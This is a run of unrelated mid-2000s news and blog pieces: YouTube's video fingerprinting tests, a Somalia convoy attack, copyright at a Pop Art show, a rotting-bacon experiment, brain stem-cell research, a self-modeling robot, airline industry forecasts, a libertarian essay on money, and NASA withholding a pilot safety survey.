NEW YORK / SAN FRANCISCO ( Reuters ) - Top online video service
YouTube will soon test a new video identification technology with two of the world 's largest media companies , Time Warner Inc. TWX.N and Walt Disney Co. DIS.N .

The technology , developed by engineers at YouTube - owner Google Inc. GOOG.O , will help content owners such as movie and TV studios identify videos uploaded to the site without the copyright owner 's permission , legal , marketing and strategy executives at YouTube told Reuters in an interview on Monday .
The so - called video fingerprinting tools , which identify unique attributes in the video clips , will be available for testing in about a month , a YouTube executive said .
“ The technology was built with the Disney ’s and Time Warner ’s in mind , ” Chris Maxcy , YouTube partner development director , said , adding that , since early this year , Google has been testing audio - fingerprinting tools with record labels .
These tools will be used to identify copyrighted material , after which media companies can decide if they would like to remove the material or keep it up , as part of a revenue - sharing deal with YouTube , which can sell advertising alongside it .
Once proven to work , the technology could be used to block the uploading of copyrighted clips , YouTube product manager David King said .
It aims to make the tools widely available to any copyright owner later this year .
YouTube has come under fire from several other traditional media companies , which say it has dragged its heels in offering reliable ways to identify video clips uploaded by regular users without permission .
Unable to reach a distribution agreement , MTV Networks - owner Viacom Inc. VIAb .
N sued Google and YouTube for more than $ 1 billion in damages in March , charging the company with " massive intentional copyright infringement " after demanding the removal of clips of its popular shows " Colbert Report " and " Daily Show , " hosted by comedian Jon Stewart .
Media companies have eyed the wildly popular video - sharing site as a mixture of opportunity and threat as they seek to reach consumers wherever they spend time .
On one hand , they view YouTube as a powerful promotional medium to drive viewers back to television or their own sites .
On the other , YouTube ’s traffic has soared as users upload copyrighted shows globally onto the service .
Nine months ago , YouTube said such tools would be made available to media companies for testing by the end of 2006 .
But the reliable identification of content has proved a complex task that required Google to develop its own technology tools .
Maxcy said other media companies planned to test the technology , but he declined to name these other parties .
“ There are a couple , ” he said , referring to Disney and Time - Warner .
“ There are more that we ca n’t talk about right now , ” he said .
YouTube officials said they have quietly been testing ways to help identify the audio tracks of video clips with major record labels using technology from privately held Audible Magic as early as the first two months of 2007 .
These tools will be made available to all content owners later this year depending on the results of the tests , YouTube executives said on Monday .
“ It ’s typically not something we talk about , ” Maxcy said , adding , however : “ We wanted to clear the air . ”
Maxcy said that over time , Google planned to add additional layers of technology to better spot content on its service .

Associated Press Writer
MOGADISHU , Somalia ( AP ) – Ethiopian troops shot and killed five bystanders Wednesday after a land mine exploded as their convoy passed through the center of a western Somali town , police said .
A remote - controlled land mine detonated in the town of Belet Weyne as the last vehicle in the convoy , a water tanker , passed .
“ Then the Ethiopians opened fire on civilians , ” police Col. Yusuf Aden told The Associated Press by telephone from Belet Weyne , 180 miles north of the capital , Mogadishu .
“ Five people , all of them passers - by , were killed and three others were wounded . ”
It was the first time an Ethiopian army convoy has been attacked outside the capital , where Ethiopian trucks have been frequently targeted .
The Ethiopian troops are backing Somalia ’s fragile government against radical Islamic insurgents .
The explosion rocked the town center , and huge plumes of smoke rose into the sky , said Ali Iid , a witness .
The Ethiopian soldiers fired in all directions , then controlled movement at the site for 10 minutes before driving off , Iid told the AP by telephone .
“ I saw five people lying in the street , including a woman , ” he said .
Somalia ’s U.N. - backed transitional government was sidelined by a radical Islamic group until Ethiopia ’s military intervened in December and turned the tide .
Insurgents linked to the Islamic group have vowed to wage an Iraq - style guerrilla war , saying the government is allowing Ethiopia to occupy the country .
The government claimed victory over the insurgents last month after battles in Mogadishu that killed at least 1,670 people and drove a fifth of the city ’s 2 million residents to flee .
Somalia has not had an effective central government since 1991 , when warlords ousted longtime dictator Mohamed Siad Barre and then turned on one another .
The excellent programme for Pop Art Portraits , the current exhibition at London 's National Portrait Gallery , has a lot to say about the pictures hanging on the walls and the diverse source material the artists used to produce their provocative works .
Apparently they cut up magazines , copied comic books , drew trademarked cartoon characters like Minnie Mouse , reproduced covers from Time magazine , made ironic use of a cartoon Charles Atlas , painted over iconic photos of James Dean and Elvis Presley - and that 's just in the first of seven rooms .
The programme describes the aesthetic experience conjured up by these transmogrified icons of high and low culture .
Celebrated pop artists including Larry Poons , Robert Rauschenberg and Andy Warhol created these images by nicking the work of others , without permission , and transforming it to make statements and evoke emotions never countenanced by the original creators .
Despite this , the programme does not say a word about copyright .
Can you blame the authors ?
A treatise on the way that copyright and trademarks were - had to be - trammelled to make these works could fill volumes .
Reading the programme , you can only assume that the curators ' message about copyright is that where free expression is concerned , the rights of the creators of the original source material must take a back seat to those of the pop artists .
There is , however , another message about copyright in the National Portrait Gallery : it is implicit in the " No Photography " signs prominently displayed throughout its rooms , including one by the entrance to the Pop Art Portraits exhibition .
These signs are not intended to protect the works from the depredations of camera flashes ( otherwise they would read " No Flash Photography " ) .
No , the ban on pictures is meant to safeguard the copyright of the works hung on the walls - a fact that every member of staff I asked instantly confirmed .
Indeed , it seems every square centimetre of the National Portrait Gallery is under some form of copyright .
I was n't even allowed to photograph the " No Photographs " sign .
A member of staff explained that the typography and layout of the signs was itself copyrighted .
If true , presumably the same rules would prevent anyone from taking any pictures in any public place - unless you could somehow contrive to get a shot of Leicester Square without any writing , logos , architectural facades or images in it .
Otherwise I doubt even Warhol could have got away with it .
So what 's the message of the show ?
Is it a celebration of remix culture , revelling in the endless possibilities opened up by appropriating and reusing images without permission ?
Or is it the epitaph on the tombstone of the sweet days before the UN set up the World Intellectual Property Organization and the ensuing mania for turning everything that can be sensed and recorded into someone 's property ?
Does this show - paid for with public money , with some works that are themselves owned by public institutions - seek to inspire us to become 21st century pop artists , armed with cameraphones , websites and mixers , or is it supposed to inform us that our chance has passed and we'd best settle for a life as information serfs who can't even make free use of what our eyes see and our ears hear ?
Perhaps , just perhaps , this is actually a Dadaist show masquerading as a pop art show .
Perhaps the point is to titillate us with the delicious irony of celebrating copyright infringement while simultaneously taking the view that even the " No Photography " sign is a form of property not to be reproduced without the permission that can never be had .

Here 's a full year of " preservation : "
It 's a pretty ghastly endeavor , so prepare yourself .
I love the textures and growths and all the fun stuff .
But for some crazy reason some people might not think it 's totally awesome .
So consider yourself duly warned , ya pansy .
Here is the sun , as seen through the stained - glass window of a year old slice of bacon .
It 's a beautiful thing , is n't it ?
It is .
Glorious .
This one is one of my favorite pictures .
It 's the " brain " striations of some awesomely distorted pork flesh and / or fungus , highlighted by the white grows of various other molds and grossness .
It 's just ... neat .
And a view of the underside not staring at the sun .
It 's rad how the colors really have n't changed too much because of the seal it formed against the lexan .
The edges are brilliant and crisp and the " meat " - if you could still call it that - looks almost like rubber .
This egg .
Man , this crazy egg .
For two months it hardly did a thing .
For four months it barely moved .
Gradually over the course of a year it morphed into a cloudy gelatinous puddle .
Still , it 's not eggxactly brimming with astounding stalagmites of terror .
But it does have some rad internal textures and clouds .
See ?
So , after a year of anxious waiting , I could finally show you all the big payoff .
It kept slowly rotting .
Yup .
Are n't you happy ?
I know you are !
I know I am .
And yes , now I did actually throw them out .
I do n't want them coming into the new house with us .
You know , they never did smell - not even a hint of bad odor .
I guess that means the seals must 've held just fine , because I assume otherwise they would 've been stinking to high heaven .
All in all it was a really interesting project .
Really , probably the longest effort I put into any project , even if most of it was to just let it sit there and not accidentally knock over the egg container .
Bacon rules !
LIKE other fields of endeavour , science has fashions — and one of its most fashionable areas at the moment is the study of stem cells .
This is a subject that provokes high passions , particularly when the cells in question are drawn from human embryos .
It also encourages the lowest form of scientific behaviour , fabricating data ( see article ) .
A tragicomic stem - cell story , however , is probably a first .
But a piece of research reported in this week 's New England Journal of Medicine by Zhu Jianhong of Fudan University and his colleagues began that way .
Its first subject was a woman admitted into Huashan Hospital in Shanghai with a chopstick in her brain .
It ended triumphantly , though , with the trial of a treatment that may heal the sort of brain injuries that the woman in question suffered .
Stem cells are the cells responsible for making bodies , and then repairing the natural wear and tear to which they are subject while they are alive .
The body - forming cells are the embryonic stem cells that are causing so much political trouble in America because obtaining them involves destroying early - stage embryos known as blastocysts .
Some people think that destroying blastocysts is murder .
The repairing sort of cells , though , are uncontroversial , and are turning up in more and more places .
Even tissues once believed not to change much after childhood , and thus not to need the renewing ministrations of stem cells , are yielding them .
Heart - muscle tissue , for example , has recently been shown to have them .
Another place where they were not , at first , expected to exist is the brain .
But they do .
And that discovery meant that the unfortunate lady who had had a chopstick thrust through one of her eyes into part of her brain called the inferior prefrontal subcortex ( IPS ) presented an opportunity .
When the utensil was removed , Dr Zhu decided to try culturing the tissue that came out with it , to see whether there were any stem cells there .
Waste not , want not
To his delight , the extracted tissue thrived and grew , and many of the cells in the resulting culture did indeed contain proteins known to be characteristic of neural stem cells .
But Dr Zhu wanted to be sure that that was truly what he had .
The defining feature of a stem cell is self - renewal .
When such a cell divides , at least one of its daughters is also a stem cell ( the other may set off on the route to specialisation that allows stem cells to generate new tissue ) .
The way to test whether a particular cell is a stem cell , therefore , is to grow it individually .
A single stem cell will divide continuously and form a spherical colony consisting of its progeny .
Other cells will not .
Dr Zhu found that about 4 % of the cells from his chopstick - injured patient were able to form such colonies , which confirmed his conjecture .
Thus inspired , he started collecting samples from other patients with traumatic open - head injuries ( though none with quite such an unusual cause as the first ) .
He has managed to derive neural stem cells from 16 of these patients , out of a total of 22 , and believes that success depends on which region of the brain is affected .
Cells from the IPS are the best source , so it seems he was lucky in his original patient .
The point of the exercise , though , was to see whether neural stem cells could be obtained reliably , with a view to using them as a treatment .
For a suitable dose of stem cells might not only help a damaged piece of tissue to repair itself ; it would also , if the cells in question had come from the patient who was being treated , escape attack by his immune system .
This idea of self - treatment is one of the reasons adult stem - cell science is so fashionable .
First , Dr Zhu tried it out on mice ( the mice in question had had their immune systems turned off , so that they would not reject the transplanted cells ) .
He injected stem cells he had cultured from his patients into mouse brains and found that they successfully differentiated into the various cell types found in the nervous system .
Just as importantly , the resulting nerve cells were able to conduct electrical impulses and could form the specialised junctions called synapses , by means of which nerve cells talk to each other .
Having shown that the stem cells worked in healthy mouse brains , Dr Zhu tried them out on injured mouse brains .
Another common property of stem cells is to accumulate at sites of injury , where their services are obviously needed .
In order to track the movements of the cells , his team attached tiny magnetic particles to them before they transplanted them , and also injected them with a dye .
They found that cells implanted into healthy brains stayed put , whereas those implanted into damaged brains moved towards the injured area .
The final animal trial was a safety test using monkeys .
It was designed to look for cancer , and for signs that the cells had wandered from the brain to other organs such as the heart and the liver , where they might have caused trouble .
No such signs were seen .
So the team moved on to people .
They transplanted neural stem cells derived from eight patients with open - head injuries back into the patients who had provided the initial tissue and allowed the cells to migrate to the injury sites .
( In one case , they used magnetic particles to follow the process . )
Then they asked a separate group of specialists to look both at their experimental patients and at a group of people with similar brain injuries but no transplant .
The second research group did not know who had and who had not been treated , so as to make the trial “ blind ” .
Using standard behavioural tests , they concluded that the treated patients had lower disability scores .
As Dr Zhu stresses , this is a mere pilot study , and it is too early to draw strong conclusions .
But if subsequent work confirms his finding , what started as an unfortunate piece of serendipity may lead to a valuable new technique for repairing injured brains .
Starfish Robot Shows Robotic Introspection And Self - Modeling
A new four - legged robot can automatically synthesize a predictive model of its own topology ( where and how its body parts are connected ) , and then successfully move around .
It can also use this " proprioceptive " sense to determine if a component has been damaged , and then model new movements that take the damage into account .
In their article , Josh Bongard , Victor Zykov , and Hod Lipson describe their experiment :
We demonstrate , both computationally and experimentally , how a legged robot automatically synthesizes a predictive model of its own topology ( where and how its body parts are connected ) through limited yet self - directed interaction with its environment , and then uses this model to synthesize successful new locomotive behavior before and after damage .
The legged robot learned how to move forward based on only 16 brief self - directed interactions with its environment .
These interactions were unrelated to the task of locomotion , driven only by the objective of disambiguating competing internal models .
These findings may help develop more robust robotics , as well as shed light on the relation between curiosity and cognition in animals and humans ...
If the robot is damaged , it can sense the problem and attempt to compensate .
The robot has tilt and angle sensors in all of its joints ; readings from these sensors are used by the robot to create a self - image .
If sensors indicate that a part is missing or damaged , it changes its image of itself and moves on .
As for sf references , everybody remembers the HAL - 9000 unit that ran the spaceship in 2001 : A Space Odyssey .
HAL was also able to sense problems in the ship and then get one if its servants ( the human astronauts ) to install new components , if necessary .
Despite their achievement , the researchers remain modest in the face of nature .
" We never officially named it , but we usually refer to it as the Starfish robot , even though a real starfish has five rather than four legs , " said lead researcher Josh Bongard , now at the University of Vermont .
" Also , a real starfish is much better than our robot at recovering from injury , because it can actually regrow its legs . "
Update 24 - Nov-2006 : See a remarkable Starfish robot video .
Take look as some earlier work by Lipson and Zykov et al in this article - Self - Replicating Modular Robots .

— The Best News Links from the Baseball Newsstand Bloomberg : No Fantasy ; Major League Baseball Loses Data Ruling Major League Baseball lost a court ruling over player performance statistics , as a federal appeals court said companies that operate fantasy sports leagues have a First Amendment right to use such data for free .
Writing for the Eighth Circuit panel ( .pdf ) , Judge Arnold explained ( citations omitted ) :
The Supreme Court has directed that state law rights of publicity must be balanced against first amendment considerations , and here we conclude that the former must give way to the latter .
First , the information used in CBC ’s fantasy baseball games is all readily available in the public domain , and it would be strange law that a person would not have a first amendment right to use information that is available to everyone .
It is true that CBC ’s use of the information is meant to provide entertainment , but “ [ s ] peech that entertains , like speech that informs , is protected by the First Amendment because ‘ [t ] he line between the informing and the entertaining is too elusive for the protection of that basic right . ’”
We also find no merit in the argument that CBC ’s use of players ’ names and information in its fantasy baseball games is not speech at all .
We have held that “ the pictures , graphic design , concept art , sounds , music , stories , and narrative present in video games ” is speech entitled to first amendment protection .

What Will U.S. Air Travel Look Like in Ten Years ?
A Freakonomics Quorum
We ’ve blogged quite a bit about airline travel over the past couple of years , covering everything from the future of pilotless airplanes to security snafus to the likelihood of an all - business - class U.S. airline .
I do n’t think this reflects our overwhelming curiosity about the subject as much as the fact that we both happen to be on planes a lot .
That said , it is an interesting industry , complex and full of change .
For providers , costs are high and rising ; consumers , however , have gotten accustomed to dirt - cheap fares .
For all the security hassles , scheduling woes , and general discontent , the industry is extraordinarily safe and , at the end of the day , a marvel .
( FWIW , here is a recent draft paper , by the economists Severin Borenstein and Nancy L. Rose , called “ How Airline Markets Work … or Do They ? ” )
So in the tradition of past Freakonomics Quorums on the music industry , street charity , and climate change , we asked a few industry insiders — Clifford Winston , Richard Branson , Gary Topping , Patrick Smith and Josh Marks — to address the following question :
The U.S. airline market is a mess right now , with unhappiness increasing among customers , employees , and executives .
While certain companies have become profitable again , the future looks murky .
What will the U.S. airline industry look like in 10 years in terms of prices ?
Customer service ?
Safety ?
Technology ?
The economics of the business itself ?
Here are their answers .
Many thanks to the five of them for their thoughts and time .
Clifford Winston , Senior Fellow in Economic Studies at the Brookings Institution :
The U.S. airline industry is a victim of its own success — intense competition and low fares that have contributed to steady growth in air travel — and a victim of poor government policy toward airports and air traffic control that has prevented runway and airspace capacity from staying ahead of passenger demand .
The results are mounting congestion and delays that raise airlines ’ costs , infuriate passengers , and demoralize employees .
The solution requires the following : 1 ) to charge all aircraft for the delays caused by their takeoffs and landings , as well as the delays caused by their use of airspace near airports ; to increase the number of runways at congested airports ; 2 ) to introduce technological aids that would facilitate additional operations on parallel runways and reduce the separation between aircraft when they take off and when they land ; and 3 ) to implement a satellite - based air traffic control system that , among other things , would give pilots the freedom to choose the most efficient routing , altitude , and speed of their flights .
By using the price mechanism to reduce peak - period demand for runway and airspace capacity , by expanding runway capacity at the most congested airports , and by adopting new technologies to enable more aircraft to use available runway and airspace capacity , air travel delays would be substantially reduced .
In the process , competition would flourish , and the nation ’s exceptional air safety record would get even better .
Unfortunately , congestion pricing is perceived by policymakers to be a political loser .
And , based on experience , the time that it takes to build new runways and introduce new technologies is most accurately measured in decades .
Richard Branson , founder and chairman of the Virgin Group :
This summer , as Virgin America launched , I was asked to comment on the state of air travel .
Where most people see mess , I see opportunity .
Thirty years ago , when I was stranded at an airport , I chartered a plane , sold seats to other stranded passengers , and in effect started Virgin Atlantic Airways .
Our airline began with stranded passengers in mind , and that focus — customers first — continues to drive all our businesses .
The American traveling public has proven , with their dollars , where the future lies for commercial air travel : next generation , low fare , point - to - point carriers .
This segment now owns one - third of the market , up from about 5 percent in the early 1990s .
Consumers have been abandoning legacy carriers for years , and that decision is proving that there ’s money to be made if you listen to what customers have to say .
I ’ll use Virgin America as an example , since it launched just two months ago — on a morning when JFK was hit by a tornado ( only the second tornado ever to hit New York ! ) , during what people said was the absolute worst time to start an airline .
Virgin America chose to design a travel experience around the question , “ How do people travel now ? ”
If they are subject to long lines , delays , weather , and shabby planes , then why not try out innovations that we and our passengers can control ?
Virgin America passengers are entertained with 25 movie options , TV , games , in - flight chatting , and music .
They can order food whenever they want it .
They have power to charge up computers and , by next year , will have WiFi access at their seats .
And why not have a bit of fun with mood lighting and a soundtrack in the bathrooms ?
Not an earth - shattering idea ; but still , a new approach in the airline business .
As the best financed new U.S. airline of all time , Virgin America has the luxury of making these investments , driving down ticket prices , and sparking an in - flight entertainment war .
As with most other things , more competition is good for everyone .
In addition to our financing , Virgin America has other key cost - savings , including a streamlined , tech - savvy business model and a brand new fleet that is fuel - efficient and saves on fuel costs ( and mitigates the impact on the environment ) .
With an increasing focus on climate change , airlines have an opportunity and a responsibility to innovate with cleaner fuels and efficient planes .
We ’ve made business decisions with that in mind , such as pledging 100 percent of our profits from all our transportation companies to direct investments in clean energy .
I believe we ’ll see a lot more improvements there — and perhaps more pledges towards bringing clean energy to an otherwise dirty industry .
You ’d mentioned private aviation in an earlier post , so I ’ll make a brief point about that .
Travelers who ’ve had enough of commercial air travel actually have greater options in private aviation .
That market is growing at over 25 percent per year , in part due to the growth of business travel and a willingness to spend more to get places faster .
It helps that travelers can fly in and out of over 5,000 private airports in the U.S. , compared to 500 commercial airports .
New pricing models and very light jets are lowering the barrier to entry .
We ’re doing our bit with Virgin Charter , an online marketplace for sellers to put up their flights and for buyers to find and book flights as easily , as if on Expedia .
So , the way I see it , it ’s a brilliant time to be in the air travel business .
Especially if you put yourself in other people ’s shoes and ask , “ How can I make this better for them ? ”
Gary Topping , CEO of Topping Travel and former executive at Malev Airways , Qantas , and Windward Island Airways in the Caribbean :
Usually from chaos we eventually get order .
But whether ten years is enough to bring the U.S. Airline industry to order is a topic that I ’m not sure will ever be solved without some meaningful government involvement .
Taxes collected by government departments from both passengers and airlines should be used for the purpose for which they were collected , not sidelined to other budget needs .
Our airways and airports are in desperate need of upgrades before the system declines into complete gridlock .
In the future , the price of fuel will drive new technology , leading to the development of more fuel - efficient and environmentally friendly aircraft .
Technology and fuel prices will also do away with the “ 65th in line to take off ” syndrome .
Baggage will be electronically tagged , never to be lost again .
Airway - clogging , gas - guzzling , inefficient , and uncomfortable RJs will disappear from the skies .
The “ Big Six ” will become the “ Bigger Four . ” LLCs will merge and take over international flying across both the Atlantic and Pacific , and begin offering two classes of service .
First Class will disappear , to be replaced by an upgraded business class .
Economy will evolve into “ Economy Extra ” and “ Economy Squeeze . ”
Niche carriers will expand their reach , with more flying into European markets , offering better value .
And finally , maybe an enlightened U.S. airline CEO will see through the fog of the bean counters and realize that “ happy employees ” also make happy ( and dedicated ) customers .
Patrick Smith , a commercial pilot , columnist for Salon.com and the author of Ask the Pilot : Everything You Need to Know About Air Travel :
To begin with , I would somewhat disagree with the premise .
Flying is perhaps less enjoyable than ever before ; but that , in itself , does not equate to a market in disarray .
The industry is in a period of transition and readjustment , coming off the most ruinous five - year stretch in its history .
The majors have survived , and are now in a game of catch - up , streamlining their business models to stay ahead of feisty mavericks like JetBlue .
Most passenger disappointment is driven by two things : security hassles and flight delays .
The existing security protocols are , for the most part , immensely absurd and tedious , but there is only so much the airlines themselves can do about it .
What the situation will be like ten years from now is anyone ’s guess .
Here ’s hoping that as time goes on , the TSA revises its more wasteful and arbitrary policies , improving the flow of passengers through terminals .
The likelihood of that happening depends partly on the mindset of the traveling public .
Thus far , spooked by the specter of “ terrorism , ” be it real or perceived , travelers have expressed a rather troubling willingness to accept nonsensical , intrusive , and humiliating policy in the name of security .
The delays issue , on the other hand , is caused almost entirely by airline over - scheduling , a product of the industry ’s self - defeating philosophy that frequency of flights is the ultimate key to success .
Airlines have portioned ever more passengers onto smaller and smaller planes making more and more departures , bringing runways and taxiways to the point of gridlock .
But although this is a serious problem , it ’s also one that is eminently fixable .
Carriers are finally beginning to see the wisdom of consolidating flights using larger planes and / or taking advantage of off - peak time slots .
( If they do n’t , the government might force them to . )
Look for this trend to continue .
Airfares , meanwhile , continue to hover around historic lows .
The average ticket costs approximately what it did in the early 1980s , despite tremendous spikes in fuel costs .
Just for this reason , more people are flying than ever before .
Thus , the service aspect becomes a two - edged sword : now that flying is a truly egalitarian , mass - market mode of getting around , it ’s unreasonable to expect top - notch treatment .
What the legacy airlines hope to come up with is a profitable , sustainable way of providing both dignified customer service and low fares .
Our safety record has been almost impeccable .
Some 30,000 commercial aircraft depart each day in the U.S. , carrying around two million people , and virtually every one of them arrives safely .
The last accident involving a U.S. major carrier was almost six years ago — the longest such stretch in the industry ’s history .
There are now twice as many jetliners , carrying twice as many people , as there were a quarter century ago .
Yet as a percentage of total flights , the accident rate has fallen sharply .
Training and technology are the drivers here , and they continue to improve .
Accidents will never be eliminated entirely , but in ten years we can expect to be looking at statistics that are no less impressive , or possibly better .
All in all , short of an extreme fuel crisis or economic calamity ( either or both of which are possible ) , there is no reason to believe that the skyscape will look terribly different a decade from now .
Our perspective , maybe , is what needs to change most .
Domestic air travel will never again be glamorous or elite , and a certain degree of hassle and discomfort is unavoidable in a business that , by 2015 , will be hauling a billion Americans annually , at affordable fares , in reasonable comfort and in near - perfect safety .
Josh Marks , founder and executive vice president of MAXjet :
The economics of the airline business have seen fundamental changes recently .
Customer demand has shifted , with frequent - flyer programs becoming less important ( has anyone noticed how hard it is to redeem miles these days ? ) , and value - for - money becoming the primary purchase consideration .
Economics have also shifted , with oil prices skyrocketing and the market growing tighter for new and used aircraft .
In addition , airlines must cope with continuing airspace and airport congestion driven by an increase in schedules without a corresponding shift in air - traffic control capacity .
Specialization in the airline business is a trend that started three decades ago , with the emergence of Southwest Airlines .
Southwest offered a radical change to the industry — a carrier with a focused product offering a focused set of routes .
Southwest had a clear vision for its role in the industry and has executed faithfully on that vision through economic cycles .
In the process , Southwest spawned blatant imitators as well as subsequent generations of low - cost carriers that combined a cost focus with product enhancements .
Today , that specialization is spreading industry - wide , with new all - business - class airlines such as Eos and MAXjet offering affordable fares on international routes , and new entrants such as Virgin America launching with a focus on long - haul domestic flights .
It is unlikely that the aircraft you now fly domestically will be much different ten years from now .
The next - generation replacements for today ’s Boeing and Airbus domestic airplanes will just be entering service , and a few revolutionary Boeing 787s will be flying international routes .
But other than that , the aircraft are not likely to change .
It is also unlikely that our airport infrastructure will see significant capacity increases over the next ten years .
As such , without fundamental change in fuel efficiency or physical infrastructure , how will airlines continue growing ?
One key will be continued specialization .
There is room in retail for Wal - Mart , Nordstrom and Saks , just as there is room in the airline industry for SkyBus , Southwest , JetBlue , United , MAXjet , Virgin America and others .
And there is room because some days value - seeking consumers wish to shop at Wal - Mart , and some days these consumers will find their high value item at Saks .
Like their retail counterparts , each airline will need to understand its specific value proposition and customer base to maintain a unique identity .
For regional passengers — flying from secondary city to secondary city in the U.S. — the mass - marketing major airlines stand the best chance of aggregating enough traffic to offer affordable fares .
On high - volume routes with pockets of customers who seek the best product or the best fare , there will be a wide diversity of product offered and a range of fares .
We are seeing that now in markets such as New York to Los Angeles , with even major carries like United offering a distinct product on the route from the rest of their network .
Cheap fares will still be available , but do not expect a lot of comfort or freebies .
Another key will be more efficient utilization of airspace .
Cancellations and delays cost the airlines dearly in lost revenue , wasted fuel , and repositioning costs .
To improve utilization of today ’s terminals , runways and airspace , the technology we take for granted in our cars ( and even our BlackBerries ) needs to be adapted to the skies .
Global positioning systems and data communications between aircraft and controllers must replace the antiquated radar - and - radio infrastructure that we have now outgrown .

DIGG THIS
If you have boarded an airplane recently , you know something about how the state lives in a strange , alternative universe in which good sense , normal courtesies , and sound judgment play no role .
No aspect of life is perfect , but the sectors the state manages are wacky and topsy - turvy .
Thus we are expected to believe that every living person who boards an airplane is a potential terrorist , and every person is just as much a risk as every other person .
We are expected to believe that because the state forces us to carry deodorant in a little baggy , that we are safer from hijackings than we would otherwise be .
We are supposed to gain comfort when we see a TSA employee testing a tube of toothpaste to make sure that it wo n’t explode on board .
It is all so ridiculous , and oddly alarming .
If there is one thing we can know for sure , it is that a regular terrorist is not going to subject himself to these petty investigations .
The source of trouble will be completely unexpected .
The bureaucrats only do what they are told to do , and those making the rules have no financial incentive to decouple authentic from bogus threats .
But the unreality of the state is hardly limited to the preposterous charade of airport security .
It affects even the current market turmoil that began in the sub - prime mortgage market .
The ideological basis of the meltdown began during the New Deal , when the government decided that the American Dream could only be achieved through housing ownership — not renting but owning .
As time went on , every conceivable mechanism was pulled into order to realize this dream .
What if borrowing rates are too high for people to afford ?
We ’ll beat them down with the sledgehammer of government policy .
What if the financial risk is still too high ?
Who cares , we ’ll subsidize it .
What if there is no credit history or savings on which to justify taking the risk ?
We ’ll guarantee it .
With what ?
With newly created money .
What if mortgage lenders still are n’t convinced that they will get paid ?
We ’ll make them lend money no matter what , and even threaten them with lawsuits if they do n’t .
So on it went for seventy years , until one day the entire hoax was exposed by the ultimate reality test : the market economy .
Bad credit risks did n’t pan out .
Those who lent without regard for underlying fundamentals are suddenly seeing red all over the place .
Bankruptcy ensues .
Those who purchased repackaged mortgages on the open market find themselves with a hot potato and no one to toss it to .
So what does the government do then ?
It runs to the basement and turns on the printing presses .
It creates $ 37 billion on the spot and buys up the bad loans and calls them assets .
The government says that this is to create confidence .
But confidence ca n’t be created by making up reality .
That path only leads to more illusion and error .
It turns out that creating money out of thin air has a downside too .
Every dollar you create waters down the value of the existing stock of money .
It ’s just like stretching the lemonade at a picnic : people eventually notice the difference .
The people who get the money first — the big investment banks — do n’t experience the price rise , but later users of the same money do .
With inflation , the government has another problem to deal with .
Business becomes more expensive for producers and consumers .
This hurts business and the economy begins to suffer .
Those who have saved for a rainy day begin to see the value of the savings frittered away , and they reconsider the merits of financial prudence , thus reducing savings and capital accumulation even more .
By short - circuiting market mechanisms , the monetary planners cause even more damage to the production side .
The sub - prime mortgage calamity should have sent a signal to cut back dramatically .
Housing starts have weakened , but we are still way above where we would be if markets ruled .
As it is , there is no way for buyers to know when it is safe to enter the market again .
We ca n’t know if bad investments have been liquidated or not .
Reality has been once again kept at bay .
This one sector is but a symptom of a much larger problem : an economy floating on debt and the promise to create ever more trillions in new money in order to pay it .
We are burdened by the world ’s biggest and most powerful state , but it is running on empty promises that have nothing to do with the real world .
The illusions generated by the paper - money economy subsidize further illusions , such as the belief that the US government can invade any country in the world and impose US - style government at the point of a gun .
There is no need for consultation with Congress or public opinion because the money needed to pay for such adventures is unlimited .
Politicians with this kind of power go mad with ambition and lose the habit , drawn from the real world , to think about the relationship between cause and effect .
There is nothing they wo n’t try if they can get away with it .
Nor do they particularly care if their plans amount to naught , since they are not held accountable .
If the market turns down again , if another terrorist incident occurs , or if another country erupts in flames after our attempt to dominate it , who or what gets the blame ?
Not the state .
The relationship between cause and effect is too vague and elusive because people do n’t have enough basic economic understanding to trace it all out .
Thus does the illusion of statecraft perpetuate itself .
If we were to make one change that would do the most to put an end to this illusory living by the state , it would be to take away from the politicians and the bureaucrats the right to create money at all .
A solid gold standard in which every dime spent had to come from an existing stock of money would shatter the whole system .
Is it any wonder that this is the last subject politicians ( except Ron Paul ) want to talk about ?

The Best of Llewellyn H. Rockwell , Jr.
I broke with habit and watched Tim Russert 's show today .
After he finished his interview with John Edwards he brought on a panel of pundits since who wants to hear from presidential candidates when you could listen to journalists talking to each other .
We had Russert , David Broder , Margaret Carlson , Ted Koppel , and David Brody -- not bad as far as these things go .
Eventually , someone -- either Russert or Koppel -- noted that the New York City press , which knows Rudy Giuliani much better than the national press corps , has been full in recent months of hard - hitting coverage that substantially undermines the narrative Giuliani is trying to create about his own campaign .
This , it seemed to me , was an interesting topic for a national broadcast television show .
Maybe these worthy panelists would inform their audience of these pieces of information known to New Yorkers , and resolve to bring this information to their audiences at Time , The Washington Post , NPR , CBN , and the various General Electric - owned media properties .
Sorry , just kidding .
It did n't occur to me for a minute that they would do this .
And , indeed , they did n't .
Instead , they went meta and had a brief discussion of why it is that these accurate accounts of Giuliani 's record and personal behavior " do n't penetrate . "
And , of course , they never considered the possibility that their own failure to report on these accurate portrayal 's of Giuliani 's record and personal behavior might play any role in it .
Instead , they concluded that his Powers of 9/11 Awesomeness must just be too great for the truth the penetrate .
They were , however , willing to be scathingly critical of Fred Thompson for saying " Soviet Union " went he meant " Russia . "

Facebook MOFFETT FIELD , Calif . 
Anxious to avoid upsetting air travelers , NASA is withholding results from an unprecedented national survey of pilots that found safety problems like near collisions and runway interference occur far more frequently than the government previously recognized .
NASA gathered the information under an $ 8.5 million safety project , through telephone interviews with roughly 24,000 commercial and general aviation pilots over nearly four years .
Since ending the interviews at the beginning of 2005 and shutting down the project completely more than one year ago , the space agency has refused to divulge the results publicly .
Just last week , NASA ordered the contractor that conducted the survey to purge all related data from its computers .
The Associated Press learned about the NASA results from one person familiar with the survey who spoke on condition of anonymity because this person was not authorized to discuss them .
A senior NASA official , associate administrator Thomas S. Luedtke , said revealing the findings could damage the public 's confidence in airlines and affect airline profits .
Luedtke acknowledged that the survey results " present a comprehensive picture of certain aspects of the U.S. commercial aviation industry . "
The AP sought to obtain the survey data over 14 months under the U.S. Freedom of Information Act .
" Release of the requested data , which are sensitive and safety - related , could materially affect the public confidence in , and the commercial welfare of , the air carriers and general aviation companies whose pilots participated in the survey , " Luedtke wrote in a final denial letter to the AP .
NASA also cited pilot confidentiality as a reason , although no airlines were identified in the survey , nor were the identities of pilots , all of whom were promised anonymity .
Among other results , the pilots reported at least twice as many bird strikes , near mid-air collisions and runway incursions as other government monitoring systems show , according to a person familiar with the results who was not authorized to discuss them publicly .
The survey also revealed higher - than - expected numbers of pilots who experienced " in-close approach changes " — potentially dangerous , last - minute instructions to alter landing plans .
Officials at the NASA Ames Research Center in California have said they want to publish their own report on the project by year 's end .
